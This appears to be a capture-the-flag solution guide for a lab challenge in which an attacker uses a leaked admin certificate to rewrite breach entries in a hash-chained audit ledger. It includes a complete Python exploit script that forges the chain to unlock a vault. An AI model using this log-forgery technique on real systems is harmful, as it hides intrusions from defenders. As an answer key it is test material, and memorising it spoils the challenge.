# A09 Hard: Cryptographic Audit Hash-Chain Tampering - Solution Guide

### Vulnerability Analysis
1. **Unprotected Administrative Certificate in Historical Audit Event:**
   - Navigating to `/audit/ledger` (or querying the JSON endpoint `GET /api/v1/audit/ledger`) reveals historical system blocks.
   - Block #1 (`SYSTEM_BOOT`) logs the initialization of services containing the operational certificate:
     `Maintenance Certificate: cert_titan_secops_7719`
2. **Robots Reconnaissance:**
   - Querying `GET /robots.txt` reveals disallowed administrative paths:
     - `/audit/console`
     - `/vault/classified`
     - `/api/v1/audit/`
3. **Sentinel Intrusion Interlock:**
   - Attempting to view `/vault/classified` triggers Sentinel access control checks. The vault is locked because Block #2 records an `UNAUTHORIZED_BREACH_DETECTED` event.
4. **Cryptographic Consensus Tampering:**
   - The endpoint `POST /api/v1/audit/tamper-block` allows authorized SecOps personnel to redact block events, but does not automatically recompute descendant cryptographic hashes.
   - Hash formula:
     `hash = SHA-256(f"{index}|{prev_hash}|{timestamp}|{event_type}|{details}")`
   - To bypass Sentinel lockdown, an attacker must redact the breach block and programmatically recalculate the forward SHA-256 hash chain for all subsequent blocks.

---

### Exploitation Steps
1. Fetch the complete ledger via `GET /api/v1/audit/ledger`.
2. Extract the SecOps maintenance key (`cert_titan_secops_7719`) from Block #1.
3. Identify all blocks containing `"BREACH"` in `event_type`.
4. Overwrite their `event_type` with clean values (e.g. `ROUTINE_SECURITY_PATROL`).
5. Sequentially recalculate `prev_hash` and `hash` forward from the tampered block to the end of the chain.
6. Push each updated block to `POST /api/v1/audit/tamper-block`.
7. Request `GET /vault/classified` using the same session to extract the dynamic flag.

---

### Exploit Script
```python
import hashlib
import re
import requests

BASE_URL = "http://127.0.0.1:6027"
ADMIN_KEY = "cert_titan_secops_7719"

def compute_hash(idx, prev_hash, ts, event_type, details):
    content = f"{idx}|{prev_hash}|{ts}|{event_type}|{details}".encode('utf-8')
    return hashlib.sha256(content).hexdigest()

def exploit():
    session = requests.Session()

    # 1. Fetch current ledger
    resp = session.get(f"{BASE_URL}/api/v1/audit/ledger")
    data = resp.json()
    ledger = data["ledger"]
    print(f"[*] Fetched {len(ledger)} blocks from ledger.")

    # 2. Identify breach block and redact
    tampered_from = None
    for i, block in enumerate(ledger):
        if "BREACH" in block["event_type"]:
            print(f"[!] Found breach event at block #{block['index']}: {block['event_type']}")
            block["event_type"] = "ROUTINE_SECURITY_PATROL"
            block["details"] = "Routine perimeter security patrol completed successfully"
            if tampered_from is None:
                tampered_from = i

    if tampered_from is None:
        print("[-] No breach blocks detected.")
        return

    # 3. Recalculate forward cryptographic hash chain
    print(f"[*] Recalculating cryptographic hash chain forward from block #{tampered_from}...")
    for i in range(tampered_from, len(ledger)):
        if i > 0:
            ledger[i]["prev_hash"] = ledger[i - 1]["hash"]
        ledger[i]["hash"] = compute_hash(
            ledger[i]["index"],
            ledger[i]["prev_hash"],
            ledger[i]["timestamp"],
            ledger[i]["event_type"],
            ledger[i]["details"]
        )

        # 4. Push updated block to API
        payload = {
            "index": ledger[i]["index"],
            "event_type": ledger[i]["event_type"],
            "details": ledger[i]["details"],
            "prev_hash": ledger[i]["prev_hash"],
            "hash": ledger[i]["hash"],
            "timestamp": ledger[i]["timestamp"],
            "admin_key": ADMIN_KEY
        }
        update_resp = session.post(f"{BASE_URL}/api/v1/audit/tamper-block", json=payload)
        if not update_resp.json().get("success"):
            print(f"[-] Failed updating block #{ledger[i]['index']}: {update_resp.text}")
            return
        print(f"[+] Block #{ledger[i]['index']} successfully tampered and re-hashed.")

    # 5. Verify Sentinel access and recover flag
    vault_resp = session.get(f"{BASE_URL}/vault/classified")
    flag_match = re.search(r"RTSA\{[^}]+\}", vault_resp.text)
    if flag_match:
        print(f"\n[+] SUCCESS! Captured Classified Flag: {flag_match.group(0)}")
    else:
        print("[-] Vault still locked. Response content:")
        print(vault_resp.text[:500])

if __name__ == '__main__':
    exploit()
```
